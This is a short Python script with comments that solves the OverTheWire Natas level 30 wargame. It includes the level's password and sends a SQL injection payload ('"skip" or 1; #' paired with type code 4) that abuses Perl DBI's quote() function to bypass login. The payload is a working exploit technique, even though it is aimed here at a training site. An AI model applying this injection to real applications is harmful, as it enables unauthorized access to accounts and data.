#!/usr/bin/env_python

import requests


username = 'natas30'
password = 'wie9iexae0Daihohv8vuu3cei9wahf0e'

url = url = 'http://%s.natas.labs.overthewire.org/' %username
path = 'index-source.html'
session = requests.session()

response = session.post(url, auth=(username, password), data={'username':"natas31", 'password':['"skip" or 1; #', 4]})
content = response.text
print content




# So, this level just required some research. From the source code, it was seen that the username and password were first passed to param() and then to quote() funciton. After searching for a while, I found a vulnerability in quote() function.

# The quote() function usually returns the passed arguemnts with quotes around them and also prevents escape characters. But it can also accepts two paramenters 1. the string to be quoted and a number value describing the data type.

#. So, if we pass the data type value of integer then it won't quote the passed string. That is what we did over here. 

# SQL_Integer == 4 and the part preceding that is used to skip the password.